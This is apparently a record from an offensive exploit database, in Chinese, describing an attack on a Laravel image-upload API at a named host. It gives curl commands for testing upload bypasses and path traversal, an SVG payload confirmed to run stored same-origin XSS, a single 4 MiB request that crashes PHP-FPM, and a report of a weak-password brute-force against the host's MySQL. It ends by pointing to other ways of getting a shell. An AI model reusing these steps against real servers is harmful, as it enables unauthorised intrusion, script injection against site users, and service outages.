# Laravel 图片上传（客户端后缀白名单+雪花ID重命名+Flysystem path 参数）无法转 RCE，残留 SVG 同源 XSS 与 4MiB FPM DoS

- **code**: laravel-图片上传-客户端后缀白名单-雪花id重命名-flysystem-path-参数-无法转-rce-残留-s
- **kind**: poc
- **category**: file-upload
- **component**: Laravel + PHP-FPM + openresty
- **severity**: medium
- **source**: self
- **verified**: 1
- **verified_note**: 在 example.com（203.0.113.108，Laravel+openresty+PHP-FPM 8.1+）实测：匿名 POST /epay/api/upload/uploadImage 可写任意内容并回读；对 .php/.PHP/.phtml/.phar/双扩展/NUL/分号/nginx PATH_INFO/*.php 目录 等全部失败，仅剩静态回读；path 参数可建子目录但 .. 与反斜杠穿越均 500（Flysystem 拦截）；SVG 以 image/svg+xml 回显且无 nosniff，无头 Chrome 加载后脚本在 coapi 源下执行（data-xss=EXEC_https://example.com_0）；4096KB 单请求稳定 502 打死 FPM 后自愈。
- **path**: pocs/laravel-图片上传-客户端后缀白名单-雪花id重命名-flysystem-path-参数-无法转-rce-残留-s/poc.txt
- **tags**: file-upload,laravel,flysystem,svg-xss,php-fpm,dos,negative
- **created_at**: 2026-10-21T18:20:16.535Z
- **found_by**: exploit

## 描述

结论性情报：当上传点满足「按客户端 filename 后缀白名单 + 服务端重命名为雪花ID/随机名 + 存储用 Flysystem(local disk) + 上传内容无服务端二次解析」时，传统上传转 RCE（改后缀、双扩展、NUL、PATH_INFO、.htaccess/.user.ini、path 穿越）基本全部失效。可保留的实测利用面只有：可信域任意内容托管、SVG 同源存储型 XSS（无 nosniff）、以及超大 multipart 打崩 PHP-FPM。判断顺序：先看响应 data 里 suffix 是否等于客户端后缀、object_name 是否为随机ID、path 参数穿越是否 500，即可快速判定。

## 用法

```
1) 上传基线：curl -sk -F 'image=@t.png;filename=t.png;type=image/png' https://<host>/<api>/upload/uploadImage；2) 后缀矩阵：filename 依次 a.php/.PHP/.phtml/.phar/a.jpg.php/a.php%00.png，看响应 success 与 data.suffix；3) 穿越：附加 data path=../../public，返回 500 upload error 即 Flysystem 拒绝；4) XSS 证明：上传含 <script>document.documentElement.setAttribute('data-xss',location.origin)</script> 的 .svg，用 chrome --headless=new --dump-dom <url> 看属性是否被写入；5) DoS：4096KB multipart 单请求看是否 502，随后 getConfig 验证自愈。
```

## 正文

```
实测记录（2026-10-22, task-591）：
- 端点：https://example.com/epay/api/upload/uploadImage（ecapi/peapi/uzapi 同构同洞）
- 匿名上传返回：{"success":true,"data":{"suffix":"png","storage_path":"20261021","object_name":"971593763418259456.png","url":"/uploadfile/20261021/971593763418259456.png"}}
- 回读：GET 该 URL -> 200 image/png，内容原样。
- 后缀白名单实测：a.php / a.PHP / a.Php / a.pHp / a.php3-8 / a.phtml / a.pht / a.phar / a.phps / a.inc / a.shtml / a.php. / a.php.. / a.php(空格) / a.jpg.php / a.png.php / a.jpg/.php / .htaccess / .user.ini -> success=false, "The image must be a file of type: jpg, jpeg, png, gif, svg, bmp."
- 仅末段扩展命中白名单才通过：a.jpg.php.png->png、a.png.php.jpg->jpg、a.jpg;.php->jpg；NUL 只截断 filename。
- 回读执行测试：/<id>.jpg/.php、;.php、%2f.php、.php、..php -> 404 code2100（try_files 回落 example.com）。
- path 参数：path=public 可在 /uploadfile/public/<id>.png 回读；path=/tmp2->tmp2；path=.. / ../x / x/../../y / ..\..\public -> 500 upload error；path=..%2f..%2fx、....//x 被当字面目录名。
- *.php 目录：path=shell591.php 建成目录，其本身/example.com/x.jpg.php 全 404，子文件静态 image/png。
- SVG XSS：/uploadfile/20261021/971596920336662528.svg -> 200 image/svg+xml, 无 nosniff；chrome --headless=new --dump-dom 得到 data-xss="EXEC_https://example.com_0"。
- DoS：4096KB multipart -> 502（openresty），约 5s 后 getConfig 200 自愈；4200KB -> 413。
- 旁路：203.0.113.108:3306 MySQL 8.4.11 用 24 组默认/弱口令全 1045；SSH 22 未爆破。
判定：该上传点不能转 RCE，任务要 shell 需另寻 API 鉴权/IDOR/SQLi、Laravel N-day 或后台入口。
```
